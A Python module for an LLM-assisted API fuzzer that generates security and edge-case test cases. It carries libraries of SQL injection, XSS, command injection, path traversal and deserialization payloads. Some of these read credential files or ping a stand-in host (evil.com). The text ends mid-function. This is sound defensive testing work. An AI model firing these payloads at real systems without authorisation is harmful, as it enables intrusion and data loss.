"""
LLM-Assisted Fuzzing System for intelligent input generation.
Generates edge cases and invalid inputs that traditional fuzzing might miss.
"""

import json
import os
import random
import string
from typing import Dict, List, Any, Optional, Union, Generator
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass

try:
    from openai import OpenAI
    OPENAI_AVAILABLE = True
except ImportError:
    OPENAI_AVAILABLE = False

from ..database.connection import get_db_session
from ..database.models import APISpecification, TestCase, TestType
from ..utils.logger import get_logger

logger = get_logger(__name__)

class FuzzingStrategy(Enum):
    """Different fuzzing strategies."""
    STRING_INJECTION = "string_injection"
    ENUM_MUTATION = "enum_mutation"
    BOUNDARY_VALUES = "boundary_values"
    TYPE_CONFUSION = "type_confusion"
    STRUCTURAL_FUZZING = "structural_fuzzing"
    SEMANTIC_FUZZING = "semantic_fuzzing"
    ADVERSARIAL_INPUTS = "adversarial_inputs"

class PayloadType(Enum):
    """Types of malicious/edge case payloads."""
    SQL_INJECTION = "sql_injection"
    XSS_INJECTION = "xss_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    BUFFER_OVERFLOW = "buffer_overflow"
    UNICODE_EXPLOIT = "unicode_exploit"
    FORMAT_STRING = "format_string"
    DESERIALIZATION = "deserialization"

@dataclass
class FuzzingTarget:
    """Target for fuzzing operations."""
    endpoint: str
    method: str
    parameter_name: str
    parameter_type: str
    parameter_location: str  # "query", "path", "header", "body"
    current_value: Any
    constraints: Dict[str, Any]

@dataclass
class FuzzedPayload:
    """Generated fuzzed payload."""
    payload_id: str
    original_value: Any
    fuzzed_value: Any
    strategy: FuzzingStrategy
    payload_type: Optional[PayloadType]
    expected_outcome: str
    risk_level: str  # "low", "medium", "high"
    description: str

class LLMAssistedFuzzer:
    """
    LLM-assisted fuzzing system that generates intelligent edge cases.
    
    Features:
    - Context-aware payload generation using LLM
    - Traditional fuzzing techniques enhanced with AI
    - Semantic understanding of parameter purposes
    - Adversarial input generation
    - Coverage-guided fuzzing optimization
    """
    
    def __init__(self):
        self.db = get_db_session()
        self.openai_client = None
        
        # Initialize OpenAI client
        if OPENAI_AVAILABLE:
            api_key = os.getenv("OPENAI_API_KEY")
            if api_key and api_key != "your_openai_api_key_here":
                try:
                    self.openai_client = OpenAI(api_key=api_key)
                    logger.info("LLM-assisted fuzzer initialized with OpenAI")
                except Exception as e:
                    logger.warning(f"Failed to initialize OpenAI: {str(e)}")
        
        # Fuzzing payload libraries
        self.payload_libraries = self._initialize_payload_libraries()
        
    def _initialize_payload_libraries(self) -> Dict[PayloadType, List[str]]:
        """Initialize libraries of known malicious/edge case payloads."""
        
        return {
            PayloadType.SQL_INJECTION: [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "admin'--",
                "' UNION SELECT * FROM users --",
                "1'; WAITFOR DELAY '00:00:05'--",
                "'; exec xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM users) > 0 --"
            ],
            PayloadType.XSS_INJECTION: [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "';alert('XSS');//",
                "<svg onload=alert('XSS')>",
                "<%2fscript%3ealert('XSS')<%2fscript%3e",
                "<script>fetch('/admin').then(r=>alert(r.text()))</script>"
            ],
            PayloadType.COMMAND_INJECTION: [
                "; ls -la",
                "| whoami",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "& dir",
                "; sleep 10",
                "|| ping -c 1 evil.com"
            ],
            PayloadType.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../../../../etc/shadow",
                "..\\..\\..\\..\\boot.ini"
            ],
            PayloadType.BUFFER_OVERFLOW: [
                "A" * 1000,
                "A" * 10000,
                "A" * 100000,
                "\x00" * 1000,
                "\xff" * 1000,
                "%" * 1000,
                "9" * 1000
            ],
            PayloadType.UNICODE_EXPLOIT: [
                "\u0000",  # Null byte
                "\u202e",  # Right-to-left override
                "\ufeff",  # Byte order mark
                "\u2028",  # Line separator
                "\u2029",  # Paragraph separator
                "𝓲𝓷𝓿𝓪𝓵𝓲𝓭",  # Unicode lookalikes
                "⁰¹²³⁴⁵⁶⁷⁸⁹"  # Unicode digits
            ],
            PayloadType.FORMAT_STRING: [
                "%s%s%s%s%s%s%s%s%s%s",
                "%p %p %p %p %p",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "AAAA%08x.%08x.%08x.%08x",
                "%s" * 100
            ],
            PayloadType.DESERIALIZATION: [
                '{"__class__": "subprocess.Popen", "args": ["calc"]}',
                '{"$type": "System.Diagnostics.Process"}',
                'O:8:"stdClass":1:{s:4:"evil";s:4:"code";}',
                'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0',
                '{"@type":"java.lang.Class","val":"java.io.InputStream"}'
            ]
        }
    
    async def generate_fuzzed_test_cases(
        self,
        api_spec_id: int,
        endpoint: str,
        method: str,
        fuzzing_strategies: Optional[List[FuzzingStrategy]] = None,
        payload_count: int = 50,
        use_llm: bool = True
    ) -> List[TestCase]:
        """
        Generate fuzzed test cases for an endpoint.
        
        Args:
            api_spec_id: API specification ID
            endpoint: Target endpoint
            method: HTTP method
            fuzzing_strategies: Strategies to use (if None, uses all)
            payload_count: Number of fuzzed payloads to generate
            use_llm: Whether to use LLM for intelligent fuzzing
            
        Returns:
            List of generated fuzzed test cases
        """
        try:
            # Get API specification and endpoint details
            api_spec = self.db.query(APISpecification).filter(
                APISpecification.id == api_spec_id
            ).first()
            
            if not api_spec:
                raise ValueError(f"API specification {api_spec_id} not found")
            
            # Extract endpoint information
            endpoint_info = self._extract_endpoint_info(api_spec, endpoint, method)
            
            # Identify fuzzing targets
            fuzzing_targets = self._identify_fuzzing_targets(endpoint_info, endpoint, method)
            
            # Generate fuzzed payloads
            if use_llm and self.openai_client:
                llm_payloads = await self._generate_llm_fuzzed_payloads(
                    fuzzing_targets, api_spec, payload_count // 2
                )
            else:
                llm_payloads = []
            
            # Generate traditional fuzzed payloads
            traditional_payloads = self._generate_traditional_fuzzed_payloads(
                fuzzing_targets, fuzzing_strategies, payload_count - len(llm_payloads)
            )
            
            # Combine all payloads
            all_payloads = llm_payloads + traditional_payloads
            
            # Create test cases from payloads
            test_cases = []
            for i, payload in enumerate(all_payloads):
                test_case = await self._create_test_case_from_payload(
                    api_spec_id, endpoint, method, payload, i
                )
                test_cases.append(test_case)
            
            # Save test cases to database
            saved_test_cases = []
            for test_case in test_cases:
                self.db.add(test_case)
                self.db.flush()
                saved_test_cases.append(test_case)
            
            self.db.commit()
            
            logger.info(f"Generated {len(saved_test_cases)} fuzzed test cases for {method} {endpoint}")
            return saved_test_cases
            
        except Exception as e:
            logger.error(f"Fuzzing test generation failed: {str(e)}")
            raise ValueError(f"Fuzzing failed: {str(e)}")
    
    def _extract_endpoint_info(
        self, 
        api_spec: APISpecification, 
        endpoint: str, 
        method: str
    ) -> Dict[str, Any]:
        """Extract detailed information about an endpoint for fuzzing."""
        
        endpoints = api_spec.parsed_endpoints or {}
        endpoint_data = endpoints.get(endpoint, {})
        method_data = endpoint_data.get(method.lower(), {})
        
        return {
            "endpoint": endpoint,
            "method": method.upper(),
            "summary": method_data.get("summary", ""),
            "description": method_data.get("description", ""),
            "parameters": method_data.get("parameters", []),
            "request_body": method_data.get("requestBody", {}),
            "responses": method_data.get("responses", {}),
            "security": method_data.get("security", []),
            "tags": method_data.get("tags", [])
        }
    
    def _identify_fuzzing_targets(
        self, 
        endpoint_info: Dict[str, Any],
        endpoint: str,
        method: str
    ) -> List[FuzzingTarget]:
        """Identify parameters and fields that can be fuzzed."""
        
        targets = []
        
        # Add query parameters
        for param in endpoint_info.get("parameters", []):
            if param.get("in") == "query":
                targets.append(FuzzingTarget(
                    endpoint=endpoint,
                    method=method,
                    parameter_name=param.get("name", "unknown"),
                    parameter_type=param.get("type", "string"),
                    parameter_location="query",
                    current_value=param.get("example", "test_value"),
                    constraints=param.get("schema", {})
                ))
        
        # Add path parameters
        for param in endpoint_info.get("parameters", []):
            if param.get("in") == "path":
                targets.append(FuzzingTarget(
                    endpoint=endpoint,
                    method=method,
                    parameter_name=param.get("name", "unknown"),
                    parameter_type=param.get("type", "string"),
                    parameter_location="path",
                    current_value=param.get("example", "123"),
                    constraints=param.get("schema", {})
                ))
        
        # Add header parameters
        for param in endpoint_info.get("parameters", []):
            if param.get("in") == "header":
                targets.append(FuzzingTarget(
                    endpoint=endpoint,
                    method=method,
                    parameter_name=param.get("name", "unknown"),
                    parameter_type=param.get("type", "string"),
                    parameter_location="header",
                    current_value=param.get("example", "test_header"),
                    constraints=param.get("schema", {})
                ))
        
        # Add request body fields
        request_body = endpoint_info.get("request_body", {})
        if request_body and method.upper() in ["POST", "PUT", "PATCH"]:
            content = request_body.get("content", {})
            json_content = content.get("application/json", {})
            schema = json_content.get("schema", {})
            
            if schema and "properties" in schema:
                for prop_name, prop_schema in schema["properties"].items():
                    targets.append(FuzzingTarget(
                        endpoint=endpoint,
                        method=method,
                        parameter_name=prop_name,
                        parameter_type=prop_schema.get("type", "string"),
                        parameter_location="body",
                        current_value=prop_schema.get("example", "test_value"),
                        constraints=prop_schema
                    ))
        
        return targets
    
    async def _generate_llm_fuzzed_payloads(
        self,
        fuzzing_targets: List[FuzzingTarget],
        api_spec: APISpecification,
        payload_count: int
    ) -> List[FuzzedPayload]:
        """Generate intelligent fuzzed payloads using LLM."""
        
        if not self.openai_client or not fuzzing_targets:
            return []
        
        try:
            payloads = []
            
            # Group targets by parameter type for efficient generation
            targets_by_type = {}
            for target in fuzzing_targets:
                param_type = target.parameter_type
                if param_type not in targets_by_type:
                    targets_by_type[param_type] = []
                targets_by_type[param_type].append(target)
            
            # Generate payloads for each type
            for param_type, targets in targets_by_type.items():
                type_payload_count = min(payload_count // len(targets_by_type), 20)
                
                for target in targets[:3]:  # Limit to top 3 targets per type
                    target_payloads = await self._generate_llm_payloads_for_target(
                        target, api_spec, type_payload_count
                    )
                    payloads.extend(target_payloads)
            
            return payloads[:payload_count]
            
        except Exception as e:
            logger.error(f"LLM fuzzing failed: {str(e)}")
            return []
    
    async def _generate_llm_payloads_for_target(
        self,
        target: FuzzingTarget,
        api_spec: APISpecification,
        count: int
    ) -> List[FuzzedPayload]:
        """Generate LLM-guided payloads for a specific target."""
        
        try:
            prompt = self._build_fuzzing_prompt(target, api_spec, count)
            
            response = self.openai_client.chat.completions.create(
                model=os.getenv("OPENAI_MODEL", "gpt-4"),
                messages=[
                    {
                        "role": "system",
                        "content": "You are an expert security researcher and API fuzzing specialist. Generate edge cases and potentially malicious inputs that could break APIs or reveal vulnerabilities."
                    },
                    {"role": "user", "content": prompt}
                ],
                temperature=0.8,  # Higher temperature for creative fuzzing
                max_tokens=1500
            )
            
            content = response.choices[0].message.content
            payload_data = self._parse_llm_fuzzing_response(content, target)
            
            return payload_data[:count]
            
        except Exception as e:
            logger.error(f"LLM payload generation failed for target {target.parameter_name}: {str(e)}")
            return []
    
    def _build_fuzzing_prompt(
        self,
        target: FuzzingTarget,
        api_spec: APISpecification,
        count: int
    ) -> str:
        """Build prompt for LLM-guided fuzzing."""
        
        return f"""
Generate {count} creative and potentially problematic inputs for API fuzzing.

TARGET DETAILS:
- API: {api_spec.name}
- Endpoint: {target.method} {target.endpoint}
- Parameter: {target.parameter_name}
- Type: {target.parameter_type}
- Location: {target.parameter_location}
- Current Value: {target.current_value}
- Constraints: {json.dumps(target.constraints)}

FUZZING OBJECTIVES:
1. Find edge cases that break input validation
2. Discover security vulnerabilities
3. Test boundary conditions
4. Identify type confusion issues
5. Uncover error handling problems

GENERATE INPUTS THAT MIGHT:
- Cause validation errors or exceptions
- Bypass security controls
- Trigger unexpected behavior
- Reveal sensitive information
- Cause performance degradation
- Break business logic assumptions

For each input, consider:
- SQL injection attempts (if relevant)
- XSS payloads (for string fields)
- Buffer overflow attempts (very long strings)
- Type confusion (wrong data types)
- Unicode edge cases
- Null/empty/whitespace variations
- Boundary values (min/max)
- Invalid formats
- Special characters and encoding

Return a JSON array with this structure:
[
  {{
    "fuzzed_value": "actual input value",
    "strategy": "string_injection|enum_mutation|boundary_values|type_confusion|structural_fuzzing|semantic_fuzzing|adversarial_inputs",
    "payload_type": "sql_injection|xss_injection|command_injection|path_traversal|buffer_overflow|unicode_exploit|format_string|deserialization",
    "expected_outcome": "validation_error|security_bypass|server_error|timeout|unexpected_behavior",
    "risk_level": "low|medium|high",
    "description": "Brief description of what this input tests"
  }}
]

Generate creative, realistic inputs that could actually break the API!
"""
    
    def _parse_llm_fuzzing_response(
        self, 
        content: str, 
        target: FuzzingTarget
    ) -> List[FuzzedPayload]:
        """Parse LLM fuzzing response into payload objects."""
        
        try:
            # Extract JSON from response
            start_idx = content.find('[')
            end_idx = content.rfind(']') + 1
            
            if start_idx != -1 and end_idx > start_idx:
                json_str = content[start_idx:end_idx]
                payload_data = json.loads(json_str)
                
                payloads = []
                for i, item in enumerate(payload_data):
                    payload_id = f"llm_{target.parameter_name}_{i}_{hash(str(item))}"
                    
                    payload = FuzzedPayload(
                        payload_id=payload_id,
                        original_value=target.current_value,
                        fuzzed_value=item.get("fuzzed_value"),
                        strategy=FuzzingStrategy(item.get("strategy", "semantic_fuzzing")),
                        payload_type=PayloadType(item.get("payload_type")) if item.get("payload_type") else None,
                        expected_outcome=item.get("expected_outcome", "unknown"),
                        risk_level=item.get("risk_level", "medium"),
                        description=item.get("description", "LLM-generated fuzzed input")
                    )
                    payloads.append(payload)
                
                return payloads
            
        except (json.JSONDecodeError, ValueError, KeyError) as e:
            logger.warning(f"Failed to parse LLM fuzzing response: {str(e)}")
        
        return []
    
    def _generate_traditional_fuzzed_payloads(
        self,
        fuzzing_targets: List[FuzzingTarget],
        strategies: Optional[List[FuzzingStrategy]],
        payload_count: int
    ) -> List[FuzzedPayload]:
        """Generate traditional fuzzed payloads using deterministic techniques."""
        
        if not fuzzing_targets:
            return []
        
        strategies = strategies or list(FuzzingStrategy)
        payloads = []
        
        for target in fuzzing_targets:
            target_payload_count = min(payload_count // len(fuzzing_targets), 20)
            
            for strategy in strategies:
                strategy_count = max(1, target_payload_count // len(strategies))
                strategy_payloads = self._generate_payloads_for_strategy(
                    target, strategy, strategy_count
                )
                payloads.extend(strategy_payloads)
        
        return payloads[:payload_count]
    
    def _generate_payloads_for_strategy(
        self,
        target: FuzzingTarget,
        strategy: FuzzingStrategy,
        count: int
    ) -> List[FuzzedPayload]:
        """Generate payloads for a specific fuzzing strategy."""
        
        payloads = []
        
        if strategy == FuzzingStrategy.STRING_INJECTION:
            payloads.extend(self._generate_string_injection_payloads(target, count))
        elif strategy == FuzzingStrategy.ENUM_MUTATION:
            payloads.extend(self._generate_enum_mutation_payloads(target, count))
        elif strategy == FuzzingStrategy.BOUNDARY_VALUES:
            payloads.extend(self._generate_boundary_value_payloads(target, count))
        elif strategy == FuzzingStrategy.TYPE_CONFUSION:
            payloads.extend(self._generate_type_confusion_payloads(target, count))
        elif strategy == FuzzingStrategy.STRUCTURAL_FUZZING:
            payloads.extend(self._generate_structural_fuzzing_payloads(target, count))
        elif strategy == FuzzingStrategy.ADVERSARIAL_INPUTS:
            payloads.extend(self._generate_adversarial_payloads(target, count))
        
        return payloads
    
    def _generate_string_injection_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate string injection payloads (SQL, XSS, etc.)."""
        
        payloads = []
        
        # Select appropriate payload types based on parameter context
        payload_types = []
        param_name_lower = target.parameter_name.lower()
        
        if any(term in param_name_lower for term in ["query", "search", "filter", "where"]):
            payload_types.append(PayloadType.SQL_INJECTION)
        
        if any(term in param_name_lower for term in ["name", "title", "comment", "description"]):
            payload_types.append(PayloadType.XSS_INJECTION)
        
        if any(term in param_name_lower for term in ["file", "path", "directory"]):
            payload_types.append(PayloadType.PATH_TRAVERSAL)
        
        if any(term in param_name_lower for term in ["command", "cmd", "exec"]):
            payload_types.append(PayloadType.COMMAND_INJECTION)
        
        # Default to XSS and SQL if no specific context
        if not payload_types:
            payload_types = [PayloadType.XSS_INJECTION, PayloadType.SQL_INJECTION]
        
        # Generate payloads from libraries
        for payload_type in payload_types:
            type_payloads = self.payload_libraries.get(payload_type, [])
            for i, payload_value in enumerate(type_payloads[:count//len(payload_types)]):
                payload_id = f"injection_{target.parameter_name}_{payload_type.value}_{i}"
                
                payload = FuzzedPayload(
                    payload_id=payload_id,
                    original_value=target.current_value,
                    fuzzed_value=payload_value,
                    strategy=FuzzingStrategy.STRING_INJECTION,
                    payload_type=payload_type,
                    expected_outcome="validation_error",
                    risk_level="high",
                    description=f"{payload_type.value.replace('_', ' ').title()} attempt in {target.parameter_name}"
                )
                payloads.append(payload)
        
        return payloads
    
    def _generate_enum_mutation_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate enum mutation payloads."""
        
        payloads = []
        
        # Check if parameter has enum constraints
        enum_values = target.constraints.get("enum", [])
        
        if enum_values:
            # Generate invalid enum values
            mutations = [
                "",  # Empty
                "null",  # Null string
                "INVALID",  # Generic invalid
                enum_values[0].upper() if isinstance(enum_values[0], str) else "INVALID",  # Case mutation
                enum_values[0] + "x" if isinstance(enum_values[0], str) else "INVALIDx",  # Suffix mutation
                enum_values[0][::-1] if isinstance(enum_values[0], str) else "INVALID",  # Reverse
            ]
        else:
            # Generate common invalid enum-like values
            mutations = [
                "", "null", "undefined", "INVALID", "unknown", "N/A", 
                "true", "false", "0", "1", "-1", "999", "admin", "test"
            ]
        
        for i, mutation in enumerate(mutations[:count]):
            payload_id = f"enum_{target.parameter_name}_{i}"
            
            payload = FuzzedPayload(
                payload_id=payload_id,
                original_value=target.current_value,
                fuzzed_value=mutation,
                strategy=FuzzingStrategy.ENUM_MUTATION,
                payload_type=None,
                expected_outcome="validation_error",
                risk_level="medium",
                description=f"Invalid enum value for {target.parameter_name}"
            )
            payloads.append(payload)
        
        return payloads
    
    def _generate_boundary_value_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate boundary value payloads."""
        
        payloads = []
        
        if target.parameter_type in ["integer", "number"]:
            # Numeric boundary values
            boundaries = [
                0, 1, -1, 
                2147483647,   # Max 32-bit int
                -2147483648,  # Min 32-bit int
                9223372036854775807,   # Max 64-bit int
                -9223372036854775808,  # Min 64-bit int
                float('inf'), float('-inf'), float('nan')
            ]
            
            # Add constraint-based boundaries
            if "minimum" in target.constraints:
                min_val = target.constraints["minimum"]
                boundaries.extend([min_val - 1, min_val, min_val + 1])
            
            if "maximum" in target.constraints:
                max_val = target.constraints["maximum"]
                boundaries.extend([max_val - 1, max_val, max_val + 1])
        
        elif target.parameter_type == "string":
            # String boundary values
            min_length = target.constraints.get("minLength", 0)
            max_length = target.constraints.get("maxLength", 255)
            
            boundaries = [
                "",  # Empty
                "a" * min_length if min_length > 0 else "a",  # Minimum length
                "a" * (min_length - 1) if min_length > 1 else "",  # Below minimum
                "a" * max_length,  # Maximum length
                "a" * (max_length + 1),  # Above maximum
                "a" * (max_length + 100),  # Way above maximum
                " ",  # Whitespace only
                "\n\t\r",  # Special whitespace
                "null",  # Null string
                "undefined"  # Undefined string
            ]
        
        else:
            # Generic boundary values
            boundaries = [None, "", "null", "undefined", 0, -1, True, False]
        
        for i, boundary_value in enumerate(boundaries[:count]):
            payload_id = f"boundary_{target.parameter_name}_{i}"
            
            payload = FuzzedPayload(
                payload_id=payload_id,
                original_value=target.current_value,
                fuzzed_value=boundary_value,
                strategy=FuzzingStrategy.BOUNDARY_VALUES,
                payload_type=None,
                expected_outcome="validation_error",
                risk_level="medium",
                description=f"Boundary value test for {target.parameter_name}"
            )
            payloads.append(payload)
        
        return payloads
    
    def _generate_type_confusion_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate type confusion payloads."""
        
        payloads = []
        
        # Type confusion mappings
        type_confusions = {
            "string": [123, True, False, [], {}, None],
            "integer": ["string", True, False, [], {}, None, 3.14],
            "number": ["string", True, False, [], {}, None],
            "boolean": ["string", 1, 0, [], {}, None],
            "array": ["string", 123, True, {}, None],
            "object": ["string", 123, True, [], None]
        }
        
        confused_types = type_confusions.get(target.parameter_type, [])
        
        for i, confused_value in enumerate(confused_types[:count]):
            payload_id = f"typeconf_{target.parameter_name}_{i}"
            
            payload = FuzzedPayload(
                payload_id=payload_id,
                original_value=target.current_value,
                fuzzed_value=confused_value,
                strategy=FuzzingStrategy.TYPE_CONFUSION,
                payload_type=None,
                expected_outcome="validation_error",
                risk_level="medium",
                description=f"Type confusion: sending {type(confused_value).__name__} instead of {target.parameter_type}"
            )
            payloads.append(payload)
        
        return payloads
    
    def _generate_structural_fuzzing_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate structural fuzzing payloads (malformed JSON, etc.)."""
        
        payloads = []
        
        if target.parameter_location == "body":
            # JSON structural attacks
            malformed_structures = [
                '{"unclosed": "object"',  # Unclosed JSON
                '{"key": }',  # Missing value
                '{key: "value"}',  # Unquoted key
                '{"key": "value",}',  # Trailing comma
                '{"nested": {"very": {"deep": {"object": "value"}}}}' * 10,  # Very deep nesting
                json.dumps({"circular": "ref"}) * 100,  # Large JSON
                '{"null_byte": "value\x00"}',  # Null byte in JSON
                '{"unicode": "\u0000\u202e\ufeff"}',  # Unicode exploits
            ]
            
            for i, structure in enumerate(malformed_structures[:count]):
                payload_id = f"structural_{target.parameter_name}_{i}"
                
                payload = FuzzedPayload(
                    payload_id=payload_id,
                    original_value=target.current_value,
                    fuzzed_value=structure,
                    strategy=FuzzingStrategy.STRUCTURAL_FUZZING,
                    payload_type=None,
                    expected_outcome="parsing_error",
                    risk_level="medium",
                    description=f"Malformed JSON structure for {target.parameter_name}"
                )
                payloads.append(payload)
        
        else:
            # URL encoding and structural attacks for other locations
            structures = [
                "%00",  # Null byte
                "%2e%2e%2f",  # URL encoded path traversal
                "%3cscript%3e",  # URL encoded script
                "test%0aheader-injection: value",  # Header injection
                "value\r\nSet-Cookie: malicious=true",  # CRLF injection
            ]
            
            for i, structure in enumerate(structures[:count]):
                payload_id = f"structural_{target.parameter_name}_{i}"
                
                payload = FuzzedPayload(
                    payload_id=payload_id,
                    original_value=target.current_value,
                    fuzzed_value=structure,
                    strategy=FuzzingStrategy.STRUCTURAL_FUZZING,
                    payload_type=None,
                    expected_outcome="validation_error",
                    risk_level="medium",
                    description=f"Structural attack for {target.parameter_name}"
                )
                payloads.append(payload)
        
        return payloads
    
    def _generate_adversarial_payloads(
        self, 
        target: FuzzingTarget, 
        count: int
    ) -> List[FuzzedPayload]:
        """Generate adversarial inputs designed to confuse the API."""
        
        payloads = []
        
        # Context-aware adversarial inputs
        param_name_lower = target.parameter_name.lower()
        
        if "email" in param_name_lower:
            adversarial_emails = [
                "test@",  # Incomplete email
                "@domain.com",  # Missing local part
                "test..test@domain.com",  # Double dots
                "test@domain",  # Missing TLD
                "very.long.email.address.that.exceeds.normal.limits@very.long.domain.name.that.should.not.exist.com",
                "test+tag+tag+tag@domain.com",  # Many tags
                "test@192.168.1.1",  # IP address domain
                "test@[IPv6:2001:db8::1]",  # IPv6 domain
            ]
            adversarial_values = adversarial_emails
        
        elif "phone" in param_name_lower:
            adversarial_phones = [
                "123",  # Too short
                "123-456-789012345",  # Too long
                "abc-def-ghij",  # Non-numeric
                "+1-800-CALL-NOW",  # Mixed format
                "000-000-0000",  # All zeros
                "999-999-9999",  # All nines
            ]
            adversarial_values = adversarial_phones
        
        elif "url" in param_name_lower or "link" in param_name_lower:
            adversarial_urls = [
                "not-a-url",
                "ftp://ftp.example.com",  # Wrong protocol
                "javascript:alert('xss')",  # JS protocol
                "data:text/html,<script>alert('xss')</script>",  # Data URL
                "file:///etc/passwd",  # File protocol
                "http://",  # Incomplete URL
                "http://localhost:8080/admin",  # Internal URL
            ]
            adversarial_values = adversarial_urls
        
        elif "id" in param_name_lower:
            adversarial_ids = [
                "0",  # Zero ID
                "-1",  # Negative ID
                "999999999",  # Very large ID
                "abc123",  # Mixed alphanumeric
                "null",  # Null string
                "undefined",  # Undefined string
                "../admin",  # Path traversal in ID
            ]
            adversarial_values = adversarial_ids
        
        else:
            # Generic adversarial inputs
            adversarial_values = [
                "",  # Empty
                " ",  # Whitespace
                "\x00",  # Null byte
                "\n\r\t",  # Control characters
                "A" * 1000,  # Very long string
                "🚀💣🔥",  # Emojis
                "../../etc/passwd",  # Path traversal
                "<script>alert('test')</script>",  # XSS
                "'; DROP TABLE test; --",  # SQL injection
            ]
        
        for i, adversarial_value in enumerate(adversarial_values[:count]):
            payload_id = f"adversarial_{target.parameter_name}_{i}"
            
            # Determine risk level
            risk_level = "high" if any(term in str(adversarial_value).lower() 
                                    for term in ["script", "drop", "delete", "exec", "../"]) else "medium"
            
            payload = FuzzedPayload(
                payload_id=payload_id,
                original_value=target.current_value,
                fuzzed_value=adversarial_value,
                strategy=FuzzingStrategy.ADVERSARIAL_INPUTS,
                payload_type=None,
                expected_outcome="validation_error",
                risk_level=risk_level,
                description=f"Adversarial input for {target.parameter_name}"
            )
            payloads.append(payload)
        
        return payloads
    
    async def _create_test_case_from_payload(
        self,
        api_spec_id: int,
        endpoint: str,
        method: str,
        payload: FuzzedPayload,
        index: int
    ) -> TestCase:
        """Create a test case from a fuzzed payload."""
        
        # Find the target parameter and create test data
        test_data = {
            "headers": {"Content-Type": "application/json"},
            "query_params": {},
            "path_params": {},
            "body": {}
        }
        
        # Determine how to apply the fuzzed value
        # This is simplified - in practice, you'd need to match payloads to specific targets
        if method.upper() in ["POST", "PUT", "PATCH"]:
            # Apply to body for write operations
            test_data["body"] = {"fuzzed_field": payload.fuzzed_value}
        else:
            # Apply to query params for read operations
            test_data["query_params"] = {"fuzzed_param": payload.fuzzed_value}
        
        # Expected response for fuzzed inputs (usually should fail)
        expected_response = {
            "status_code": [400, 422, 500] if payload.risk_level == "high" else [400, 422],
            "should_contain_error": True
        }
        
        # Create assertions
        assertions = [
            {
                "type": "status_code_in",
                "expected": expected_response["status_code"],
                "description": f"Fuzzed input should trigger validation error"
            },
            {
                "type": "response_time",
                "max_ms": 10000,
                "description": "Response should not timeout"
            }
        ]
        
        # Add security assertion for high-risk payloads
        if payload.risk_level == "high":
            assertions.append({
                "type": "security_check",
                "check": "no_sensitive_data_leakage",
                "description": "Response should not leak sensitive information"
            })
        
        return TestCase(
            api_spec_id=api_spec_id,
            name=f"Fuzz Test {index + 1}: {payload.strategy.value}",
            description=f"Fuzzing test using {payload.strategy.value} strategy: {payload.description}",
            test_type=TestType.SECURITY if payload.risk_level == "high" else TestType.EDGE_CASE,
            endpoint=endpoint,
            method=method.upper(),
            test_data=test_data,
            expected_response=expected_response,
            assertions=assertions,
            generated_by_llm=payload.strategy in [FuzzingStrategy.SEMANTIC_FUZZING, FuzzingStrategy.ADVERSARIAL_INPUTS],
            generation_context={
                "fuzzing_strategy": payload.strategy.value,
                "payload_type": payload.payload_type.value if payload.payload_type else None,
                "risk_level": payload.risk_level,
                "original_value": payload.original_value,
                "payload_id": payload.payload_id
            }
        )
    
    async def analyze_fuzzing_effectiveness(
        self,
        api_spec_id: int,
        session_ids: List[int]
    ) -> Dict[str, Any]:
        """Analyze the effectiveness of fuzzing strategies."""
        
        try:
            # Get fuzzing test executions
            fuzz_executions = self.db.query(TestExecution).join(TestCase).filter(
                TestCase.api_spec_id == api_spec_id,
                TestCase.test_type.in_([TestType.SECURITY, TestType.EDGE_CASE]),
                TestExecution.session_id.in_(session_ids)
            ).all()
            
            if not fuzz_executions:
                return {
                    "message": "No fuzzing executions found",
                    "analysis": {}
                }
            
            # Analyze by strategy
            strategy_results = {}
            total_vulnerabilities = 0
            
            for execution in fuzz_executions:
                # Extract strategy from generation context
                context = execution.test_case.generation_context or {}
                strategy = context.get("fuzzing_strategy", "unknown")
                
                if strategy not in strategy_results:
                    strategy_results[strategy] = {
                        "total_tests": 0,
                        "vulnerabilities_found": 0,
                        "validation_errors": 0,
                        "unexpected_successes": 0,
                        "timeouts": 0,
                        "avg_response_time": 0,
                        "response_times": []
                    }
                
                result = strategy_results[strategy]
                result["total_tests"] += 1
                
                if execution.response_time_ms:
                    result["response_times"].append(execution.response_time_ms)
                
                # Categorize results
                if execution.status == TestStatus.ERROR:
                    if execution.response_time_ms and execution.response_time_ms > 10000:
                        result["timeouts"] += 1
                elif execution.status == TestStatus.FAILED:
                    if execution.response_code and execution.response_code >= 500:
                        result["vulnerabilities_found"] += 1
                        total_vulnerabilities += 1
                    elif execution.response_code and 400 <= execution.response_code < 500:
                        result["validation_errors"] += 1
                elif execution.status == TestStatus.PASSED:
                    # Unexpected success with malicious input
                    result["unexpected_successes"] += 1
            
            # Calculate averages
            for strategy, result in strategy_results.items():
                if result["response_times"]:
                    result["avg_response_time"] = sum(result["response_times"]) / len(result["response_times"])
                    result["max_response_time"] = max(result["response_times"])
                    result["min_response_time"] = min(result["response_times"])
                
                # Calculate effectiveness score
                vulnerability_score = result["vulnerabilities_found"] * 10
                validation_score = result["validation_errors"] * 3
                timeout_penalty = result["timeouts"] * -5
                unexpected_penalty = result["unexpected_successes"] * -2
                
                result["effectiveness_score"] = max(0, vulnerability_score + validation_score + timeout_penalty + unexpected_penalty)
            
            # Overall analysis
            total_tests = sum(r["total_tests"] for r in strategy_results.values())
            vulnerability_rate = total_vulnerabilities / total_tests if total_tests > 0 else 0
            
            # Find most effective strategies
